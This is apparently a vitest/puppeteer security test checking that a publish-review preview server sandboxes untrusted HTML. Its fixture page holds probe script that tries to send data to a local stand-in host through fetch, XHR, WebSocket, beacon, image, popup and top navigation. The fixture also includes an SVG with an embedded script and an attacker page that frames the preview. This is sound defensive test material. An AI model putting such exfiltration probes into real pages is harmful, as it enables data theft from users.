import { createHash } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import puppeteer from 'puppeteer';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { ReviewPreviewServer } from '../../packages/plugin-publish-review/src/preview.js';
import { ReviewStore } from '../../packages/plugin-publish-review/src/state.js';

type FrameLike = { url(): string };

const id = 'abcdefgabc';
const hash = (data: Buffer) => createHash('sha256').update(data).digest('hex');
let target: Server;
let targetPort = 0;
const hits: string[] = [];
let preview: ReviewPreviewServer;
let url = '';

beforeAll(async () => {
  target = createServer((req, res) => {
    hits.push(req.url ?? '/');
    if (req.url === '/attacker') {
      res.setHeader('Content-Type', 'text/html');
      res.end(`<iframe src="${url}w/"></iframe>`);
    } else res.end('target');
  });
  await new Promise<void>(resolve => target.listen(0, '127.0.0.1', resolve));
  const address = target.address();
  if (!address || typeof address === 'string') throw new Error('target listen failed');
  targetPort = address.port;
  const outside = `http://127.0.0.1:${targetPort}`;
  const source =
    Buffer.from(`<!doctype html><link rel="stylesheet" href="style.css"><script src="app.js"></script><div id="marker">inside</div><script>
    window.addEventListener('load', async () => {
      try { await fetch('${outside}/fetch'); window.fetchBlocked=false } catch { window.fetchBlocked=true }
      try { const xhr=new XMLHttpRequest(); xhr.open('GET','${outside}/xhr'); xhr.send() } catch {}
      try { new WebSocket('ws://127.0.0.1:${targetPort}/ws') } catch {}
      try { navigator.sendBeacon('${outside}/beacon','x') } catch {}
      try { new EventSource('${outside}/events') } catch {}
      const img=new Image(); img.src='${outside}/image'; document.body.append(img);
      try { window.open('${outside}/popup') } catch {}
      try { top.location='${outside}/top' } catch {}
      try { document.cookie='leak=1' } catch {}
      try { localStorage.setItem('leak','1') } catch {}
      window.probeDone=true;
    });
  </script>`);
  const style = Buffer.from('#marker{color:rgb(1, 2, 3)}');
  const script = Buffer.from('window.jsLoaded=true');
  const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  const fileMap = new Map<string, { data: Buffer; type: string }>([
    ['index.html', { data: source, type: 'text/html; charset=utf-8' }],
    ['style.css', { data: style, type: 'text/css; charset=utf-8' }],
    ['app.js', { data: script, type: 'text/javascript; charset=utf-8' }],
    ['shape.svg', { data: svg, type: 'image/svg+xml; charset=utf-8' }],
  ]);
  const storage = {
    readFile: async (uri: string) => {
      const path = uri.slice(`pluginData:/publish-review/items/${id}/out/`.length);
      const file = fileMap.get(path);
      if (!file) throw new Error('missing');
      return file.data;
    },
  };
  const store = new ReviewStore(storage as never);
  store.data.queue[id] = {
    id,
    state: 'awaiting-owner',
    origin: { producer: 'paper', ref: 'task', label: 'room' },
    group: 'room',
    groupLabel: 'room',
    surfaces: ['works'],
    title: 'preview',
    summary: '',
    kind: 'html',
    files: [...fileMap].map(([path, file]) => ({ path, size: file.data.length, contentType: file.type })),
    outHashes: Object.fromEntries([...fileMap].map(([path, file]) => [path, hash(file.data)])),
    hasCover: false,
    nominatedAt: 1,
    awaitingSince: 2,
  };
  preview = new ReviewPreviewServer({ store, storage: storage as never });
  url = await preview.open(id);
});

afterAll(async () => {
  preview?.close();
  await new Promise<void>(resolve => target?.close(() => resolve()));
});

describe('review preview real-browser isolation', () => {
  it('runs own scripts and resources but blocks exfiltration, popup and top navigation', async () => {
    const browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-background-networking',
        '--host-resolver-rules=MAP * 127.0.0.1, EXCLUDE 127.0.0.1',
      ],
    });
    try {
      const page = await browser.newPage();
      await page.goto(url, { waitUntil: 'load' });
      const frame = page.frames().find((candidate: FrameLike) => candidate.url() === `${url}w/`);
      expect(frame).toBeDefined();
      await frame!.waitForFunction('window.probeDone === true', { timeout: 5000 });
      const result = await frame!.evaluate(() => ({
        jsLoaded: (window as Window & { jsLoaded?: boolean }).jsLoaded,
        fetchBlocked: (window as Window & { fetchBlocked?: boolean }).fetchBlocked,
        color: getComputedStyle(document.querySelector('#marker')!).color,
      }));
      expect(result).toEqual({ jsLoaded: true, fetchBlocked: true, color: 'rgb(1, 2, 3)' });
      await new Promise(resolve => setTimeout(resolve, 300));
      expect(page.url()).toBe(url);
      expect(hits.filter(path => path !== '/attacker')).toEqual([]);

      await page.goto(`${url}w/`, { waitUntil: 'load' });
      expect(page.url()).toBe(url);
      await page.goto(`${url}w/shape.svg`, { waitUntil: 'load' });
      expect(page.url()).toBe(url);
      await page.goto(`http://127.0.0.1:${targetPort}/attacker`, { waitUntil: 'load' });
      expect(hits).toContain('/attacker');
      expect(page.frames().some((candidate: FrameLike) => candidate.url() === `${url}w/`)).toBe(false);
    } finally {
      await browser.close();
    }
  }, 30_000);
});
